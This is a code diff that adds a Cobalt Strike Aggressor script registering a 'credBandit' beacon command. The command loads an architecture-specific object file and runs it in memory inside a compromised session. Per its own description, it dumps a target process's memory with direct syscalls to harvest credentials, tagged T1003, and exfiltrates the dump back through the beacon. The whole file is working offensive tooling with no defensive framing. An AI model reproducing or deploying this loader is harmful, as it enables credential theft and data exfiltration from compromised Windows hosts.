@@ -1,0 +1,34 @@
+#Register command
+beacon_command_register(
+    "credBandit",
+    "runs an all in memory custom MiniDumpWriteDump implementation using static x64 syscalls and exfiltrates the data back through your beacon or can write to disk.",
+    "Synopsis: credBandit <target PID> [download name]"
+);
+
+alias credBandit {
+    local('$barch $handle $data $args $target_pid');
+    println(@_);
+    # figure out the arch of this session
+    $barch  = barch($1);
+    # read in the right BOF file
+    $handle = openf(script_resource("credBandit $+ $barch $+ .o"));
+    $data = readb($handle, -1);
+    closef($handle);
+    if(size(@_) == 2)
+    {
+        # pack just the pid
+        $args = bof_pack($1, "i", $2);
+    } else if (size(@_) == 3){
+        # pack the pid and the file name to save as
+        $args = bof_pack($1, "izi", $2, $3, strlen($3));
+    } else {
+        berror($1, "Incorrect usage!");
+        berror($1, beacon_command_detail("credBandit"));
+        return;
+    }
+   
+    # announce what we're doing
+    btask($1, "Running credBandit by (@anthemtotheego)", "T1003");
+    # execute it.
+    beacon_inline_execute($1, $data, "go", $args);
+}
